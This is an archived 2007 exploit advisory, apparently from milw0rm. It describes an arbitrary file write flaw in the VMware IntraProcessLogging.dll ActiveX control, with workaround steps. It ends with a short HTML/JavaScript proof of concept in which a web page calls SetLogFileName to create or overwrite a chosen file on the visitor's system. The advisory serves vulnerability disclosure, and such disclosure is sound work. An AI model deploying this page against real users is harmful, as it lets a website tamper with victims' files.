<html><head><title>VMware IntraProcessLogging.dll 5.5.3.42958 Arbitrary Data Write Exploit</title></head><pre>&lt;!--
---------------------------------------------------------------------------

:. GOODFELLAS Security Research TEAM  .:
:. http://goodfellas.shellcode.com.ar .:

IntraProcessLogging.dll 5.5.3.42958 VmWare Inc Arbitrary Data Write Exploit
===========================================================================

Internal ID: VULWAR200707280.
-----------

Introduction
------------
IntraProcessLogging.dll is a library included in the Program Vmware from
Vmware Inc. Company.


Tested In
---------
- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.


Summary
-------
The SetLogFileName method doesn't check if it's being called from the
application,
or malicious users. Remote Attacker could craft a html page and overwrite
arbitrary
files in a system.


Impact
------
Any computer that uses this Sofware will be exposed to Data Write Arbitrary.


Workaround
----------
- Activate the Kill bit zero in clsid:AF13B07E-28A1-4CAC-9C9A-EC582E354A24
- Unregister IntraProcessLogging.dll using regsvr32.


Timeline
--------
July 28 2007 -- Bug Discovery.
July 28 2007 -- Exploit published.


Credits
-------
 * callAX &lt;callAX@shellcode.com.ar&gt;
 * GoodFellas Security Research Team  &lt;goodfellas.shellcode.com.ar&gt;


Technical Details
-----------------

SetLogFileName method receives one argument filename in this format
&quot;c:\path\file&quot;.


Proof of Concept
----------------&gt;

&lt;HTML&gt;
&lt;BODY&gt;
 &lt;object id=ctrl classid=&quot;clsid:{AF13B07E-28A1-4CAC-9C9A-EC582E354A24}&quot;&gt;&lt;/object&gt;

&lt;SCRIPT&gt;

function Do_it()
 {
   File = &quot;c:\\arbitrary_file.txt&quot;
   ctrl.SetLogFileName(File)
 }

&lt;/SCRIPT&gt;
&lt;input language=JavaScript onclick=Do_it() type=button value=&quot;Proof of
Concept&quot;&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;

# milw0rm.com [2007-07-28]</pre></html>